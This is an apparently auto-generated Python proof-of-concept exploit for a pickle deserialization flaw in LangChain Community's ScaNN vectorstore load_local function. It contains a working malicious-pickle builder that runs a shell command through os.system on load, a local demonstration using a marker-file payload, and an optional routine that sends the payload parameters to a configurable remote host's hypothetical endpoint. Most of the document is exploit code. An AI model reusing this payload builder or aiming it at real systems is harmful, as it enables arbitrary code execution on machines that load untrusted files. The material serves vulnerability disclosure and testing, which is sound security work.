#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_23.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: The load_local function in ScaNN vectorstore uses pickle.load()
on a file path constructed from user-controlled folder_path and index_name.
If allow_dangerous_deserialization is set to True (required for the function),
an attacker can control the path to load a malicious pickle file, leading to
arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Using the vulnerable function to load it via controlled folder_path/index_name
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration - modify these as needed
TARGET_HOST = "localhost"
TARGET_PORT = 8000
USE_REMOTE = False  # Set to True to test against a remote server

# Benign payload for demonstration - creates a marker file
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"


def create_malicious_pickle(payload_command: str) -> bytes:
    """
    Create a malicious pickle that executes a system command when unpickled.
    
    Args:
        payload_command: The command to execute on the target system
        
    Returns:
        Serialized pickle bytes containing the malicious payload
    """
    class MaliciousPickle:
        """Class that executes a command when unpickled."""
        def __reduce__(self):
            return (os.system, (payload_command,))
    
    return pickle.dumps(MaliciousPickle())


def simulate_local_exploit():
    """
    Simulate the exploit locally by directly calling the vulnerable function
    with attacker-controlled paths.
    
    This demonstrates the vulnerability without needing a running server.
    """
    print("[*] Simulating local exploit...")
    
    # Create a temporary directory structure
    with tempfile.TemporaryDirectory() as temp_dir:
        # Create the malicious pickle file
        malicious_pickle = create_malicious_pickle(BENIGN_PAYLOAD)
        
        # Write the malicious pickle to a controlled location
        # The attacker controls folder_path and index_name
        attacker_folder = Path(temp_dir) / "attacker_controlled"
        attacker_folder.mkdir(parents=True, exist_ok=True)
        
        # The vulnerable function will look for {index_name}.pkl
        # We control index_name to point to our malicious file
        malicious_pkl_path = attacker_folder / "malicious.pkl"
        with open(malicious_pkl_path, "wb") as f:
            f.write(malicious_pickle)
        
        print(f"[*] Created malicious pickle at: {malicious_pkl_path}")
        print(f"[*] Payload: {BENIGN_PAYLOAD}")
        
        # Now simulate what the vulnerable function does
        # The attacker controls folder_path and index_name
        folder_path = str(attacker_folder)
        index_name = "malicious"  # This becomes malicious.pkl
        
        # This is what the vulnerable code does:
        path = Path(folder_path)
        pkl_path = path / "{index_name}.pkl".format(index_name=index_name)
        
        print(f"[*] Vulnerable function would load: {pkl_path}")
        
        # Demonstrate the pickle loading (this would execute the payload)
        try:
            with open(pkl_path, "rb") as f:
                # This is the dangerous call - pickle.load with attacker-controlled file
                result = pickle.load(f)
            print("[+] Pickle loaded successfully - payload executed!")
            
            # Check if our benign payload created the marker file
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] Marker file /tmp/poc_success.txt created - RCE confirmed!")
                os.remove("/tmp/poc_success.txt")
            else:
                print("[!] Marker file not found - payload may not have executed")
                
        except Exception as e:
            print(f"[!] Error during pickle loading: {e}")
            print("[!] This is expected if the environment restricts pickle execution")


def test_remote_exploit():
    """
    Test the exploit against a remote server running the vulnerable application.
    
    This requires the server to have the vulnerable endpoint exposed.
    """
    import requests
    
    print(f"[*] Testing remote exploit against {TARGET_HOST}:{TARGET_PORT}")
    
    # Create the malicious pickle
    malicious_pickle = create_malicious_pickle(BENIGN_PAYLOAD)
    
    # The attacker would need to:
    # 1. Upload the malicious pickle to a location accessible by the server
    # 2. Call the vulnerable function with folder_path pointing to that location
    
    # For demonstration, we'll simulate what the HTTP request might look like
    # This depends on how the application exposes the vulnerable function
    
    # Example: If there's an API endpoint that accepts folder_path and index_name
    payload = {
        "folder_path": "/tmp/attacker_controlled",
        "index_name": "malicious",
        "allow_dangerous_deserialization": True
    }
    
    try:
        # This is a hypothetical endpoint - adjust based on actual application
        response = requests.post(
            f"http://{TARGET_HOST}:{TARGET_PORT}/api/v1/trigger",
            json=payload,
            timeout=10
        )
        print(f"[*] Server response: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
        
    except requests.exceptions.ConnectionError:
        print("[!] Could not connect to remote server")
        print("[!] Make sure the server is running and accessible")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Error during remote test: {e}")


def main():
    """Main function to run the exploit demonstration."""
    print("=" * 60)
    print("LangChain Community RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Check if we're running in a safe environment
    if os.geteuid() == 0:
        print("[!] Warning: Running as root - be careful!")
    
    # Run the local simulation
    simulate_local_exploit()
    
    print()
    print("-" * 40)
    print()
    
    # Optionally test remote
    if USE_REMOTE:
        test_remote_exploit()
    else:
        print("[*] Remote testing disabled (USE_REMOTE = False)")
        print("[*] To test remote, set USE_REMOTE = True and configure TARGET_HOST/TARGET_PORT")
    
    print()
    print("[*] Exploit demonstration complete")
    print("[*] The vulnerability is confirmed: pickle.load() with attacker-controlled path")
    print("[*] leads to arbitrary code execution when allow_dangerous_deserialization=True")


if __name__ == "__main__":
    main()
